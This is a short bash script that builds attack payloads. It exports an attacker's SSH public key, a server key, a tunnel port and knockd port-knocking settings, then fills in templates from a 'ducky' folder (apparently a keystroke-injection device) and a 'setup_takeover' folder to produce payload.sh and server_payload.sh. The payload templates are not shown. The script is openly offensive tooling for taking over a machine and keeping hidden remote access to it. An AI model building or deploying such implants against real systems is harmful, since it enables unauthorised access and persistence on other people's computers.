#!/bin/bash
set -euo pipefail

# We need a lot of info in one script file, so this substitutes all env
# variables in the script.sh to make it specific to our install
if [[ -d payload ]]
then
    rm -rf payload
fi

. .env

mkdir payload

export ATTACKER_PUBLIC_KEY=$(cat ssh/ATTACKER.pub)
export SERVER_PUBLIC_KEY=$(cat ssh/CENTRAL.pub)
export SERVER_TUNNEL_PORT=9999
export KNOCKD_CONF=$(cat setup_takeover/knockd.conf)
export KNOCKD_CONF2=$(cat setup_takeover/knockd)

envsubst < ducky/script.sh > payload/payload.sh
envsubst < setup_takeover/setup_knock.bash > payload/server_payload.sh


